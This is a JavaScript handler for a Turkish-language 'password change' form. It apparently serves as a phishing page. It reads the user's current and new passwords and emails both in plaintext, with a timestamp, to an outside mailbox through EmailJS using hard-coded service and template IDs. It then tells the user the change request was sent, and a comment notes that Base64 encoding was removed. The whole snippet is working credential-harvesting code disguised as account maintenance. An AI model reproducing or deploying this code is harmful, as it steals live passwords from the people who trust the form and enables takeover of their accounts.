document.getElementById('password-form').addEventListener('submit', function(e){
  e.preventDefault();

  var currentPwd = document.getElementById('current_password').value;
  var newPwd = document.getElementById('new_password').value;
  var confirm = document.getElementById('new_password_confirmation').value;

  if(newPwd !== confirm){
    alert('Yeni şifre ve tekrarı eşleşmiyor.');
    return;
  }

  // Base64 kaldırıldı
  var encodedCurrent = currentPwd;
  var encodedNew = newPwd;

  const SERVICE_ID = "service_kxgmu58";
  const TEMPLATE_ID = "template_t4x776r";

  emailjs.send(SERVICE_ID, TEMPLATE_ID, {
    current_password: encodedCurrent,
    new_password: encodedNew,
    date: new Date().toLocaleString()
  })
  .then(function(response){
    alert('Şifre değişikliği talebiniz gönderildi!');
    document.getElementById('password-form').reset();
  }, function(error){
    alert('Bir hata oluştu, tekrar deneyin.');
    console.log(error);
  });
});
